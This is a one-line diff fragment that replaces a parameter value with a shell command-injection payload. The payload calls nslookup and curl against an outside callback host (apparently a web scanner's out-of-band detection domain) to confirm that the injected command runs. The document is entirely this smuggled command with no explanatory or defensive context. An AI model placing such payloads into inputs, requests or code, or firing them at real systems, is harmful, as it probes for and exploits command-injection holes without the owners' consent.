@@ -1,1 +1,1 @@
-555&n984986=v961791
+(nslookup -q=cname hitxmvifaryffb4316.bxss.me||curl hitxmvifaryffb4316.bxss.me))
